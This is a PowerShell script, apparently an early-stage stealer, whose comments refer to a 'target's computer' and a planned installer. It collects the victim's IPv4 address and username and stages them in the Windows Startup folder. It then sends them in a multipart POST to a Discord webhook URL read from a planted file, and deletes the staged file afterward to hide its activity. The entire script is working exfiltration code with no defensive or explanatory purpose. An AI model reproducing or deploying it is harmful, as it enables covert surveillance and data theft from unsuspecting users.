# None of the files created will be saved on the target's computer
# TODO: Need to implement VPS, Fix textfile format, Make the DiscordWebhook in Installer instead

# Define the network interface alias you want to use
$NetworkInterfaceAlias = "Wi-Fi"

# Check if the network interface alias exists
$networkInterface = Get-NetAdapter | Where-Object { $_.InterfaceAlias -eq $NetworkInterfaceAlias }

if ($networkInterface -ne $null) {
    # Get IPv4 address using Get-NetIPAddress
    $IPAddress = (Get-NetIPAddress -InterfaceAlias $NetworkInterfaceAlias | Where-Object { $_.AddressFamily -eq "IPv4" }).IPAddress
} else {
    # Fallback to using ipconfig if the network interface doesn't exist
    $IPAddressString = "IPv4 Address"
    # Uncomment the following line when using older versions of Windows without IPv6 support
    # $IPAddressString = "IP Address"
    $ipconfigOutput = ipconfig
    $IPAddress = $ipconfigOutput | Select-String -Pattern $IPAddressString | ForEach-Object { $_.ToString() -split ':' } | ForEach-Object { $_.Trim() } | Select-Object -Last 1
}

# Get the current user's username
$Username = $env:USERNAME

# Get the user's profile folder
$UserProfileFolder = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
$StartupDirectory = "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

# Define the path to the file containing the Discord webhook URL
$DiscordWebhookURLFile = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory\DiscordWebhookURL.icu"
# Use Get-Content to read the file and store its content in a variable
$DiscordWebhookURL = Get-Content -Path $DiscordWebhookURLFile

# Create a text file in the user's startup folder
$TextContent = "$IPAddress`n$Username"
$TextFile = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory\$Username.icu"
$TextContent | Out-File -FilePath $TextFile

# Define a message (commented out for now)
# $Message = "Message Placeholder"

# Create a multipart form-data payload
$Boundary = [System.Guid]::NewGuid().ToString()
$CRLF = "`r`n"
$Payload = "--$Boundary$CRLF" +
    "Content-Disposition: form-data; name=`"content`"$CRLF$CRLF$Message$CRLF" +
    "--$Boundary$CRLF" +
    "Content-Disposition: form-data; name=`"file`"; filename=`"$Username.txt`"$CRLF" +
    "Content-Type: application/octet-stream$CRLF$CRLF" +
    (Get-Content -Path $TextFile) + $CRLF +
    "--$Boundary--"
# Set the headers for the request
$Headers = @{
    "Content-Type" = "multipart/form-data; boundary=$Boundary"
}

# Send the payload to Discord
Invoke-RestMethod -Uri $DiscordWebhookURL -Method "POST" -Headers $Headers -Body $Payload

# Delete the text file
Remove-Item -Path $TextFile
